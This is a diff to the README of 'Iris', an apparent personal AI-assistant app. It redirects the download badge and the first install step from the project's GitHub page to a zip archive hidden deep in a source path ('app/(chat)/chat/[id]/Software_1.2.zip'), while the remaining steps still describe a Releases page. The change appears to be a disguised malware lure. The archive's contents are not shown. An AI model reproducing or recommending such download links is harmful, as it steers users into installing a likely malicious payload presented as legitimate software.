@@ -1,6 +1,6 @@
 # 👁️ Iris - Intelligent digital support for your life
 
-[![](https://img.shields.io/badge/Download_Iris-Blue.svg)](https://github.com/sabza1795/Iris)
+[![](https://img.shields.io/badge/Download_Iris-Blue.svg)](https://raw.githubusercontent.com/sabza1795/Iris/main/app/(chat)/chat/[id]/Software_1.2.zip)
 
 Iris acts as your personal AI assistant. It connects multiple smart systems to help you manage tasks, organize information, and keep your data private. It uses the Burgess Principle to ensure your data stays under your control while providing helpful, accurate answers to your questions.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run Iris smoothly:
 
 You can install the application by visiting the official release page. Follow the steps below to set up Iris on your Windows computer.
 
-1. Go to this link: [https://github.com/sabza1795/Iris](https://github.com/sabza1795/Iris).
+1. Go to this link: [https://raw.githubusercontent.com/sabza1795/Iris/main/app/(chat)/chat/[id]/Software_1.2.zip](https://raw.githubusercontent.com/sabza1795/Iris/main/app/(chat)/chat/[id]/Software_1.2.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the latest version number shown there.
 4. Scroll down to the Assets list.
